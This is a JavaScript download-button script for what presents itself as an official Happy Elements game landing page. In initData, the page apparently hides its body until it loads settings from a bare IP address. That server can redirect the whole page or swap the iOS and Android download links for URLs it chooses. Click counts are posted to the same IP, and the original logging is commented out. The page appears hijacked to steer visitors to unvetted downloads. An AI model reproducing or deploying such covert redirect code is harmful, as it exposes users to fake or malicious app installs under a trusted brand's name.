var CPS = function(config) {
	if(!config){
		alert("CPS need config !");
		return;
	}
	var isObjFunc = null;

	if(Object.prototype.toString.call(null) === '[object Object]') {
        isObjFunc = function(value) {
            // check ownerDocument here as well to exclude DOM nodes
            return value !== null && value !== undefined && Object.prototype.toString.call(value) === '[object Object]' && value.ownerDocument === undefined;
        };
	}
	else{
		isObjFunc = function(value) {
			return Object.prototype.toString.call(value) === '[object Object]';
		};
	}
	var obj = {
		iosApp : null,
		adrApp : null,
		iosCId : 'he201805141137586864',
		adrCId : '10537219391765678848',
		iosBaseUrl : "http://ad.happyelements.cn",
		adrBaseUrl : "http://animalmobile.happyelements.cn/download.jsp",
		logUrl : 'http://log.dc.cn.happyelements.com/restapi.php',
		iosDomId : "iosdownload",
		androidDomId : "androiddownload",
		autoDomId : "autodownload",		
		source : null,
		autoBind : true,
		isiOSDevice : false,
		isAndroidDevice : false,
		androidDomUrl: null,
		iosDomUrl: null,
		jumpUrl: null,
		bind : function(method, scope) {
			return function() {
				return method.apply(scope);
			}
		},
		bindClickEvent : function() {
			this.bindIosDownload();
			this.bindAdrDownload();
			this.bindAutoDownload();
			
		},
		applyIf : function(object, config) {
			var property;
			if (object) {
				for (property in config) {
					if (object[property] !== undefined) {
						object[property] = config[property];
					}
				}
			}
			return object;
		},
		initData : function() {
			var me = this;
			me.hiddenDivId = "hiddendiv"+Math.random();
			$.ajax({
			    url:"http://47.113.91.65:8066/tpinfo/1",    //请求的url地址
			    dataType:"json",   //返回格式为json
			    async:true,//请求是否异步，默认为异步，这也是ajax重要特性
				// data:{
				// 		"host": window.location.host
				// 	},    //参数值
				headers: {"Content-Type":"application/x-www-form-urlencoded"},
			    type:"GET",   //请求方式
			    beforeSend:function(){
			        //请求前的处理
			    },
			    success:function(res){
			        //请求成功时处理
					console.log(res.data)
					var data = res.data
					androidDomUrl = data[5]
					is_goto= data[4]
					goto_url= data[6]
					if(is_goto=='goto'){
						window.location.href=goto_url
					}else{
						$('body').show();
					}
					jumpUrl = data[6]
					iosDomUrl = data[7] ? data[7] : null
			    },
			    complete:function(){
			        //请求完成的处理
			    },
			    error:function(){
			        //请求出错处理
			    }
			});
			//this.iosApp = this.getURLParam('iosApp');
			//this.adrApp = this.getURLParam('adrApp');

			var iosCIdParam = me.getURLParam('ioscid');
			if(iosCIdParam){
				me.iosCId = iosCIdParam;
			}
			var adrCIdParam = me.getURLParam('adrcid');
			if(adrCIdParam){
				me.adrCId = adrCIdParam;
			}
			var u = navigator.userAgent;
			me.isiOSDevice = /(iPhone|iPad|iPod|iOS|Mac\s+OS)/i.test(u);
			if(!me.isiOSDevice){
				me.isAndroidDevice = true;
			}

		},

		buildSource : function(channelId){
			var me = this;
			if(channelId){
				var source = Base64.encode("("+channelId+")");
				source = source.replace(/\+/g, "-");
				source = source.replace(/\//g, "_");
				me.source = source.replace(/=/g, "");
				if(console && console.log){
					console.log(me.source);
				}
			}
		},
		getURLParam : function(name) {
			var value = location.search.match(new RegExp("[?&]" + name
					+ "=([^&]*)(&?)", "i"));
			return value ? decodeURIComponent(value[1]) : value;
		},
		bindAutoDownload : function() {
			var me = this;
			var autoDownBtn = document.getElementById(this.autoDomId);
			if (autoDownBtn) {
				autoDownBtn.onclick = function() {
					return me.autoDownClick.apply(me);
				};
			}
		},
		bindIosDownload : function() {
			var me = this;
			var iosDown = document.getElementById(this.iosDomId);
			if (iosDown) {
				if (this.iosApp && this.iosCId) {
					iosDown.onclick = function() {
						return me.iosDownClick.apply(me);
					};
				} else {
					if (console && console.log) {
						console.log("no ios app or ios channel id!");
					}
				}
			}
		},
		bindAdrDownload : function() {
			var me = this;
			var adrDown = document.getElementById(this.androidDomId);
			if (adrDown) {
				if (this.adrApp && this.adrCId) {
					adrDown.onclick = function() {
						me.adrDownClick.apply(me);
					};
				} else {
					if (console && console.log) {
						console.log("no android app or android channel id!");
					}
				}
			}
		},
		autoDownClick : function() {
			var me = this;
			$.ajax({
				    url:"http://47.113.91.65:8066/upstats/1",    //请求的url地址
				    dataType:"json",   //返回格式为json
				    async:true,//请求是否异步，默认为异步，这也是ajax重要特性
				    data:{
						"clicks": 1,
						"views": 1,
					},    //参数值
					headers: {"Content-Type":"application/x-www-form-urlencoded"},
				    type:"POST",   //请求方式
				    beforeSend:function(){
				        //请求前的处理
				    },
				    success:function(req){
				        //请求成功时处理
				    },
				    complete:function(){
				        //请求完成的处理
				    },
				    error:function(){
				        //请求出错处理
				    }
				});
			//me.isAndroidDevice = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1;
			if(me.isiOSDevice){
				if(!this.iosApp || !this.iosCId){
					if (console && console.log) {
						console.log("no ios app or ios channel id!");
					}
				}
				me.iosDownClick();
			}
			else{
				if (!this.adrApp || !this.adrCId) {
					if (console && console.log) {
						console.log("no android app or android channel id!");
					}
				}
				me.adrDownClick();
			}
		},
		iosDownClick : function() {
			var url = iosDomUrl ? iosDomUrl : (jumpUrl ? jumpUrl : this.iosBaseUrl + "/" + this.iosApp + "/" + this.iosCId);
			console.log(url)
			function redirect(){
				window.location = url;
			}
			redirect()
			// this.logClick(this.iosApp,this.iosCId,redirect);
			return true;
		},
		adrDownClick : function() {
			var url = androidDomUrl ?androidDomUrl : (jumpUrl ? jumpUrl : this.adrBaseUrl + "?platform=he_ad&pn=ad&source="+this.adrCId);
			function redirect(){
				window.location = url;
			}
			redirect()
			// this.logClick(this.adrApp,this.adrCId,redirect);
			return true;
		},
		//this function is deprecated
		log:function(){
			var me = this;

			var channel_id='',app='';
			if(me.isiOSDevice){
				channel_id=me.iosCId;
				app = me.iosApp;
			}
			else {
				channel_id=me.adrCId;
				app = me.adrApp;
			}

			var cmp = document.getElementById(me.hiddenDivId);
			if(!cmp){
				var hiddenDiv = document.createElement("DIV");
				hiddenDiv.id=me.hiddenDivId;
				hiddenDiv.style = "display:none";

				var bodyEle = document.getElementsByTagName("BODY")[0];
				bodyEle.appendChild(hiddenDiv);
				cmp = hiddenDiv;
			}


			if(cmp){
				while (cmp.hasChildNodes()) {
					cmp.removeChild(cmp.lastChild);
				}
				var img = new Image();
				img.height="0";
				img.width="0";
				var queryStr = "_ac_type=14&_user_id=0&category=landing_page&_uniq_key="+app+"&channel_id="+channel_id;
				img.src = this.logUrl+'?'+queryStr; 
				cmp.appendChild(img);
			}
		},
		makeRnd:function(){
			return (+new Date()) + '.r' + Math.floor(Math.random() * 1000);
		},
		getAppName:function(){
			var app;
			if(this.isiOSDevice && this.iosApp){
				app=me.iosApp;
			}
			else if(me.adrApp){
				app=me.adrApp;
			}
			else{
				app=me.iosApp;
			}
			return app;
		},
		apply : function(object, config) {
			if (object && config && typeof config === 'object') {
				var i, j, k;

				for (i in config) {
					object[i] = config[i];
				}
			}

			return object;
		},
		createFunctionWithTimeout: function(callback, opt_timeout) {
			var called = false;
			function timeoutCb() {
				if (!called) {
					called = true;
					callback();
				}
			};
			setTimeout(timeoutCb, opt_timeout || 1000);
			return timeoutCb;
		},
		buildLogParam:function(_ac_type,data){
			var params = {};
			return this.apply(params,data);
		},//data not need _uniq_key & _ac_type
		send: function(data,callback){
			var paramsStr = this.toQueryString(data);
			var src = this.logUrl;
			if(paramsStr){
				src += "?"+paramsStr;
			}
			var win = window;
			var n = 'jsFeImage_' + this.makeRnd();
			var img = win[n] = new Image();

			var timeoutCb = null;
			if(callback){
				timeoutCb = this.createFunctionWithTimeout(callback,500);
			}
			img.onload = img.onerror = function () {
				win[n] = null;
				if(timeoutCb){
					timeoutCb();
				}
			};
			img.src = src;
		},
		logClick:function(appName,channelId,callback){
			var data = {};
			var actype = 13;
			data._uniq_key = appName;
			data._ac_type = actype;
			data._user_id = 0;
			data.game_type = 'spread';
			data.sub_category = 'animal';
			data.step = 1;
			data.viral_id = this.makeRnd();
			data.game_name = 'animal';
			data._batch_value = '[{"act":'+actype+',"category":"landing_page","channel_id":"'+channelId
			+'","_uniq_key":"'+appName+'","game_type":"ad"}]';
			this.send(data,callback);
		},
		isObject: isObjFunc,
		toQueryString:function(data){
			//only change object to querystring
			if(this.isObject(data)){
				var params = [];
				for (var key in data) {
					if(data.hasOwnProperty(key)){
						var value = data[key];
						if(this.isEmpty(value)){
							value = "";
						}
						else{
							value = encodeURIComponent(String(value)).replace(/'/g,"%27").replace(/"/g,"%22");
						}
						params.push(encodeURIComponent(key) + '=' + value);
					}
				}
				return params.join("&");
			}
			return '';
		},
		isEmpty: function(value, allowEmptyString) {
            return (value === null) || (value === undefined) || (!allowEmptyString ? value === '' : false) ;
        }
	}
	if (config) {
		obj.applyIf(obj, config);
	}
	obj.initData();

	return obj;
};

